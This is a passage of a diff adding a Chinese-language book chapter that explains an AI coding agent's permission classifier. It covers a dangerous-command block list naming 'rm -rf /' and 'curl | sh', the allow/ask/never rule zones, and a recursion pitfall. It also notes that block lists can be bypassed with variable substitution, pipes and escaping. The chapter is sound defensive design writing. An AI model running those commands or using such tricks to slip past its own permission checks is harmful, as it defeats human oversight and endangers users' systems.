+        File--&gt;&gt;Analyzer: chunk
+        Analyzer-&gt;&gt;Analyzer: 解析当前块
+    end
+    Analyzer--&gt;&gt;App: 分析结果
+    App-&gt;&gt;Cache: 存入缓存 (path + mtime → result)
+</code></pre>
+<h2 id="踩坑"><a class="header" href="#踩坑">踩坑</a></h2>
+<h3 id="-认为-dangerouspatterns-黑名单可以替代-ai-分类器"><a class="header" href="#-认为-dangerouspatterns-黑名单可以替代-ai-分类器">❌ 认为 dangerousPatterns 黑名单可以替代 AI 分类器</a></h3>
+<p>黑名单是 O(1) 的确定性检查，适合已知危险模式（<code>rm -rf /</code>、<code>curl | sh</code>）。但用户有无数种方式绕过黑名单（变量替换、pipe 组合、转义字符）。AI 分类器能理解<strong>意图</strong>，而不只是字面匹配——黑名单和分类器是互补关系，不是替代关系（<code>src/utils/permissions/dangerousPatterns.ts</code>）。</p>
+<h3 id="-在分类器内部直接调用-query-产生递归"><a class="header" href="#-在分类器内部直接调用-query-产生递归">❌ 在分类器内部直接调用 query() 产生递归</a></h3>
+<pre><code class="language-typescript">// ❌ 死递归：分类器调用 query()，query() 调用工具，工具触发分类器
+async classify(transcript, action) {
+  const result = await query({messages: [...transcript, action]})  // 再次触发分类器！
+}
+</code></pre>
+<p>AI 分类器必须使用 <code>sideQuery</code>（独立调用路径），绕过会触发权限检查的主循环（<code>src/utils/permissions/classifierDecision.ts</code>）。这是 Claude Code 中少数必须用独立调用路径而非复用主循环的场景之一。</p>
+<h3 id="-把分类器的-automoderules-三个区域理解为按危险程度排序"><a class="header" href="#-把分类器的-automoderules-三个区域理解为按危险程度排序">❌ 把分类器的 <code>AutoModeRules</code> 三个区域理解为"按危险程度排序"</a></h3>
+<p>三个区域（always_allow、ask_for_input、never_allow）不是简单的危险梯度——它们对应三种<strong>决策逻辑</strong>：</p>
+<ul>
+<li><code>always_allow</code>：操作后果可逆，无需用户感知</li>
+<li><code>ask_for_input</code>：操作后果需要用户判断上下文合理性</li>
+<li><code>never_allow</code>：无论上下文如何，都必须阻止
+把 <code>rm -rf temp/</code> 放入 <code>always_allow</code> 就是因为"temp 目录本就是临时的，Claude 有权自行清理"——不是因为"删除操作很安全"。</li>
+</ul>
+<h2 id="你能做什么"><a class="header" href="#你能做什么">你能做什么</a></h2>
+<ul>
+<li>
+<p><strong>设计递归安全的判断系统</strong>。如果你在构建"用 AI 判断 AI"的系统，采用隔离执行路径的方案。让判断逻辑使用不同的资源池、网络隔离或专用接口，确保判断本身不被它要判断的规则约束。</p>
+</li>
+<li>
+<p><strong>为 LLM 决策提供多维信息</strong>。不是简单地将规则翻译成"允许/拒绝"两个选项，而是<strong>提供三个或四个维度</strong>让 LLM 自己权衡：明确的绿灯规则、需要谨慎的灰色区域、环境约束条件。这样 LLM 的判断质量会显著提升。</p>
+</li>
+<li>
+<p><strong>评估单层防御的真实成本</strong>。当你想用一个"聪明的系统"（黑名单或 AI）处理所有威胁时，问问自己：有多少威胁是<strong>已知的且绝对危险的</strong>？这类威胁能用简单、快速的防线处理吗？如果能，<strong>不要让它们进入 LLM 分类流程</strong>。黑名单不是过时的，而是<strong>成本-精度的正确权衡</strong>。</p>
+</li>
+<li>
+<p><strong>管理 Token 预算</strong>。如果你的系统使用 LLM 做重复决策，计算一下单次调用的 token 消耗，然后<strong>设计一个有限的上下文窗口</strong>。"最后 N 轮"的启发式方法通常足够，而且能让成本可预测。</p>
+</li>
+</ul>
+<hr />
+<h2 id="向后链接"><a class="header" href="#向后链接">向后链接</a></h2>
+<p>权限规则的数据模型和优先级机制（第 17 章）是分类器的输入来源——<code>AutoModeRules</code> 和 <code>dangerousPatterns</code> 的值最终来自规则引擎的解析结果。Hooks 系统（第 18 章）提供了在分类器之前或之后注入自定义逻辑的机制。</p>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="../part4/ch15.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+
+                            <a rel="next prefetch" href="../part4/ch17.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="../part4/ch15.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+
+                    <a rel="next prefetch" href="../part4/ch17.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="../elasticlunr.min.js"></script>
+        <script src="../mark.min.js"></script>
+        <script src="../searcher.js"></script>
+
+        <script src="../clipboard.min.js"></script>
+        <script src="../highlight.js"></script>
+        <script src="../book.js"></script>
+
+        <!-- Custom JS scripts -->
+        <script src="../theme/mermaid-init.js"></script>
+
+
+    </div>
+    </body>
+</html>
